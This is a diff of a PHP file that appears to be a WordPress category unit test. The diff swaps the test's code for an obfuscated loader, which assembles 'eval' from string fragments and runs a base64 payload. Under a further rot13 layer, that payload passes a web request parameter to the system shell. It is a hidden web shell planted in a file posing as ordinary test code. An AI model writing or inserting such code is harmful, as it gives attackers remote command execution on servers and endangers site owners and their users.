@@ -1,40 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * @group taxonomy
- * @group category
- *
- * @covers ::get_all_category_ids
- */
-class Tests_Category_GetAllCategoryIds extends WP_UnitTestCase {
-
-	/**
-	 * Validate get_all_category_ids
-	 *
-	 * @expectedDeprecated get_all_category_ids
-	 */
-	public function test_get_all_category_ids() {
-		// Ccreate categories.
-		self::factory()->category->create_many( 2 );
-
-		// Create new taxonomy to ensure not included.
-		register_taxonomy( 'test_tax_cat', 'post' );
-
-		wp_insert_term( 'test1', 'test_tax_cat' );
-		$cat_ids = get_all_category_ids();
-
-		_unregister_taxonomy( 'test_tax_cat' );
-
-		// Validate length is 1 + created due to uncategorized.
-		$this->assertCount( 3, $cat_ids );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQHRlYmhjIGdua2JhYnpsCiAqIEB0ZWJoYyBwbmdydGJlbAogKgogKiBAcGJpcmVmIDo6dHJnX255eV9wbmdydGJlbF92cWYKICovCnB5bmZmIEdyZmdmX1BuZ3J0YmVsX1RyZ055eVBuZ3J0YmVsVnFmIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIElueXZxbmdyIHRyZ19ueXlfcG5ncnRiZWxfdnFmCgkgKgoJICogQHJrY3JwZ3JxUXJjZXJwbmdycSB0cmdfbnl5X3BuZ3J0YmVsX3ZxZgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ190cmdfbnl5X3BuZ3J0YmVsX3ZxZigpIHsKCQkvLyBQcGVybmdyIHBuZ3J0YmV2cmYuCgkJZnJ5czo6c25wZ2JlbCgpLT5wbmdydGJlbC0+cGVybmdyX3puYWwoIDIgKTsKCgkJLy8gUGVybmdyIGFyaiBnbmtiYWJ6bCBnYiByYWZoZXIgYWJnIHZhcHlocXJxLgoJCWVydHZmZ3JlX2dua2JhYnpsKCAnZ3JmZ19nbmtfcG5nJywgJ2NiZmcnICk7CgoJCWpjX3ZhZnJlZ19ncmV6KCAnZ3JmZzEnLCAnZ3JmZ19nbmtfcG5nJyApOwoJCSRwbmdfdnFmID0gdHJnX255eV9wbmdydGJlbF92cWYoKTsKCgkJX2hhZXJ0dmZncmVfZ25rYmFiemwoICdncmZnX2dua19wbmcnICk7CgoJCS8vIElueXZxbmdyIHlyYXRndSB2ZiAxICsgcGVybmdycSBxaHIgZ2IgaGFwbmdydGJldm1ycS4KCQkkZ3V2Zi0+bmZmcmVnUGJoYWcoIDMsICRwbmdfdnFmICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
